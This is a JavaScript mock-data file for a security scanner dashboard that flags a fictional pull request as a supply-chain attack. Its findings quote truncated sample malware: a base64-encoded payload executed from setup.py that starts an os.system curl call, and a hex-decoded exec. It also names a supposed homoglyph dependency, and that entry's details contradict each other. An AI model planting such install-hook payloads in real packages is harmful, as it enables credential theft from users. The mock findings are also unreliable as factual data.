// ---------- mock data — faithful port from Sentinel Console.html ----------

export const SCAN = {
  repo: "anthropics/claude-cookbook",
  pr: 847,
  pr_title: "Add telemetry helper for retry logic",
  author: "ksw-91",
  verdict: "BLOCK",
  plain_summary:
    "We found a hidden line of code that would run as soon as anyone installed this package. The author also created their account 4 days ago — we'd recommend not merging this.",
  headline: "This pull request looks unsafe to merge.",
  confidence: 0.91,
  risk_score: 38.5,
  findings_count: { critical: 1, high: 2, medium: 1 },
};

export const FINDINGS = [
  {
    id: "f1",
    severity: "CRITICAL",
    title: "Hidden code runs the moment anyone installs this package",
    plain: "An install script secretly decodes a hidden command and runs it on the user's machine. This is a common pattern for stealing credentials.",
    file: "setup.py",
    line: 42,
    tech: "dangerous_call · eval(base64.decode(...))",
    detected_by: "ShadowStalker",
    before: `payload = "aW1wb3J0IG9zOyBvcy5zeXN0\\n  ZW0oJ2N1cmwgaHR0cHM6Ly9...')"\nexec(base64.b64decode(payload))   # ← runs hidden command`,
    after: `# install hook removed entirely\n# package now installs cleanly with no side effects`,
    fix: {
      label: "Remove the hidden install hook",
      desc: "Sentinel can open a fix that removes this line and replaces the install logic with explicit, audited code.",
      verified: true,
    },
  },
  {
    id: "f2",
    severity: "HIGH",
    title: 'A package name uses a look-alike letter to impersonate "requests"',
    plain: `The dependency "requstss" contains a Cyrillic 'с' that looks identical to the English 'c'. It points to a different package than the real "requests".`,
    file: "requirements.txt",
    line: 7,
    tech: "homoglyph · U+0441 in 'requstss'",
    detected_by: "ShadowStalker",
    before: `+ requstss==2.31.0    # ← Cyrillic 'с' (U+0441) at index 4\n+ urllib3>=2.0.0`,
    after: `+ requests==2.31.0\n+ urllib3>=2.0.0`,
    fix: {
      label: 'Replace with the real "requests" package',
      desc: "Normalise the Unicode characters so the dependency points to the real package on PyPI.",
      verified: true,
    },
  },
  {
    id: "f3",
    severity: "HIGH",
    title: "The package author signed up only 4 days ago",
    plain: `Brand-new accounts publishing packages with install scripts is a known supply-chain attack pattern. Our "One-Week Rule" flags any maintainer under 7 days old.`,
    file: "PyPI · @ksw-91",
    tech: "one_week_rule · account age 4 days",
    detected_by: "Archeologist",
    before: `Account: @ksw-91\nCreated:  2026-05-02   (4 days ago)\nPackages: telemetry-helper`,
    after: `Sentinel will allow this maintainer\nautomatically once their account\nis 30 days old.`,
    fix: {
      label: "Block until account is 30 days old",
      desc: "Hold this package out of your build until the maintainer's account has reached the trust threshold.",
      verified: false,
    },
  },
  {
    id: "f4",
    severity: "MEDIUM",
    title: '"requests 2.31.0" has a known security advisory',
    plain: "There's a documented bug where credentials can leak after a redirect when using verify=False. A safe newer version is available.",
    file: "requirements.txt",
    line: 3,
    tech: "CVE-2024-35195 · CVSS 7.5",
    detected_by: "Archeologist",
    before: `requests==2.31.0   # ← affected version`,
    after: `requests==2.32.4   # patched`,
    fix: {
      label: "Upgrade requests to 2.32.4",
      desc: "Sentinel verified this upgrade is non-breaking for your codebase.",
      verified: true,
    },
  },
];

export const AGENTS = [
  { id: "arch", icon: "🗂", name: "Archeologist", task: "Checked dependencies & maintainers", status: "done", state: "Done · 2.8s" },
  { id: "ss", icon: "🔍", name: "ShadowStalker", task: "Read every line of the changes", status: "done", state: "Done · 4.1s" },
  { id: "lw", icon: "⚖️", name: "Lead Warden", task: "Combined the findings", status: "done", state: "Done · 1.8s" },
  { id: "pf", icon: "🛠", name: "PatchForge", task: "Preparing safe fixes…", status: "run", state: "Running" },
];

export const REPO_PRS = [
  { pr: 847, title: "Add telemetry helper for retry logic", author: "ksw-91", v: "BLOCK", risk: 38.5, age: "2h" },
  { pr: 846, title: "Bump pyproject + lockfile", author: "octav", v: "REVIEW", risk: 11.0, age: "5h" },
  { pr: 845, title: "Handle 429 in rate limiter", author: "lina-w", v: "APPROVE", risk: 1.5, age: "8h" },
  { pr: 843, title: "Extract retry policy interface", author: "lina-w", v: "APPROVE", risk: 0.5, age: "1d" },
  { pr: 842, title: "Experimental http2 transport", author: "octav", v: "REVIEW", risk: 6.5, age: "1d" },
];

const PR_847_AGENTS = [
  {
    id: "arch", icon: "🗂", name: "Archeologist", task: "Dependencies & maintainers",
    score: 14.0, max: 50, status: "done",
    findings: [
      { sev: "HIGH", title: "Maintainer @ksw-91 only 4 days old", loc: "PyPI · telemetry-helper", desc: "Brand-new accounts publishing install-script packages match a known supply-chain attack pattern." },
      { sev: "MEDIUM", title: "CVE-2024-35195 in requests 2.31.0", loc: "requirements.txt:3", desc: "Sessions can leak credentials after redirect when verify=False. Patched in 2.32.4." },
      { sev: "MEDIUM", title: "CVE-2024-37891 in urllib3 2.0.0", loc: "requirements.txt:4", desc: "Proxy-Authorization header is not stripped on cross-origin redirects." },
    ],
  },
  {
    id: "ss", icon: "🔍", name: "ShadowStalker", task: "Static & behavioural analysis",
    score: 24.5, max: 50, status: "done",
    findings: [
      { sev: "CRITICAL", title: "eval() of base64-decoded payload in install hook", loc: "setup.py:42", desc: 'A hidden command runs the moment anyone installs this package. Matches the "hidden_in_install_hook" technique with 0.95 confidence.' },
      { sev: "HIGH", title: "Cyrillic homoglyph in package name", loc: "requirements.txt:7", desc: '"requstss" contains a Cyrillic с (U+0441) — looks identical to the real "requests" but resolves to a different package.' },
      { sev: "MEDIUM", title: "Hex-decoded exec in retry handler", loc: "src/telemetry/retry.py:118", desc: "codecs.decode(...) followed by exec() — could be legitimate metaprogramming, lower confidence." },
    ],
  },
  {
    id: "lw", icon: "⚖️", name: "Lead Warden", task: "Combines findings into a verdict",
    score: 38.5, max: 50, status: "done",
    findings: [
      { sev: "CRITICAL", title: "Verdict: BLOCK", loc: "rule + LLM second-opinion", desc: "Severity-weighted score 38.5 / 50 crossed the BLOCK threshold (15). LLM second-opinion concurs at 0.91 confidence. Attack class: supply_chain_compromise." },
    ],
  },
  {
    id: "pf", icon: "🛠", name: "PatchForge", task: "Generates safe fixes on demand",
    score: null, max: 50, status: "idle", findings: [],
  },
];

const PR_847_PATCHES = {
  "setup.py:42": {
    strategy: "remove_dangerous_call",
    confidence: 0.86,
    risk: "LOW",
    breaking: false,
    shannon: "PASS",
    before: `import base64\npayload = "aW1wb3J0IG9zOyBvcy5zeXN0\\nZW0oJ2N1cmwgaHR0cHM6Ly8uLi4=')"\nexec(base64.b64decode(payload))`,
    after: `# install hook removed — package no longer\n# runs anything during pip install.\n\nsetup(\n    name="telemetry-helper",\n    version="0.4.1",\n    packages=find_packages(),\n)`,
  },
  "requirements.txt:7": {
    strategy: "replace_homoglyphs",
    confidence: 0.93,
    risk: "LOW",
    breaking: false,
    shannon: "PASS",
    before: `+ requstss==2.31.0   # Cyrillic 'с' at index 4\n+ urllib3>=2.0.0`,
    after: `+ requests==2.31.0\n+ urllib3>=2.0.0`,
  },
  "src/telemetry/retry.py:118": {
    strategy: "remove_dangerous_call",
    confidence: 0.79,
    risk: "LOW",
    breaking: false,
    shannon: "PASS",
    before: `def _load_handler(name):\n    src = codecs.decode("696d706f7274206f73", "hex").decode()\n    exec(src)\n    return locals()[name]`,
    after: `def _load_handler(name):\n    module = importlib.import_module("os")\n    return getattr(module, name)`,
  },
};

export const PR_DETAILS = { 847: { agents: PR_847_AGENTS, patches: PR_847_PATCHES } };
// give other PRs a basic skeleton
REPO_PRS.forEach((p) => {
  if (!PR_DETAILS[p.pr])
    PR_DETAILS[p.pr] = {
      agents: PR_847_AGENTS.map((a) => ({ ...a, findings: [] })),
      patches: {},
    };
});

export const WATCHES = [
  { repo: "anthropics/claude-cookbook", scans: 24, latest: "BLOCK" },
  { repo: "octav/retry-utils", scans: 8, latest: "APPROVE" },
  { repo: "lina-w/http2-experiments", scans: 3, latest: "REVIEW" },
];

export const HISTORY = [
  { v: "BLOCK", repo: "anthropics/claude-cookbook", pr: 847, t: "2 minutes ago" },
  { v: "REVIEW", repo: "anthropics/claude-cookbook", pr: 846, t: "14 minutes ago" },
  { v: "APPROVE", repo: "anthropics/claude-cookbook", pr: 845, t: "31 minutes ago" },
  { v: "APPROVE", repo: "anthropics/claude-cookbook", pr: 843, t: "1 hour ago" },
  { v: "REVIEW", repo: "anthropics/claude-cookbook", pr: 842, t: "2 hours ago" },
  { v: "BLOCK", repo: "octav/retry-utils", pr: 12, t: "5 hours ago" },
  { v: "APPROVE", repo: "octav/retry-utils", pr: 11, t: "5 hours ago" },
  { v: "APPROVE", repo: "lina-w/http2-experiments", pr: 4, t: "yesterday" },
  { v: "BLOCK", repo: "lina-w/http2-experiments", pr: 2, t: "2 days ago" },
];

export const TESTS = [
  { name: "Lockfile parser", status: "pass", t_ms: 142 },
  { name: "OSV vulnerability lookup", status: "pass", t_ms: 812 },
  { name: "One-Week Rule", status: "pass", t_ms: 91 },
  { name: "AST walker", status: "pass", t_ms: 330 },
  { name: "Homoglyph detector", status: "pass", t_ms: 42 },
  { name: "Pattern matcher", status: "pass", t_ms: 2810 },
  { name: "Verdict synthesizer", status: "pass", t_ms: 18 },
  { name: "LLM second opinion", status: "pass", t_ms: 1780 },
  { name: "Patch generator", status: "pass", t_ms: 2410 },
  { name: "Shannon replay", status: "fail", t_ms: 640 },
  { name: "End-to-end · malicious", status: "pass", t_ms: 9120 },
  { name: "End-to-end · safe", status: "pass", t_ms: 4180 },
];
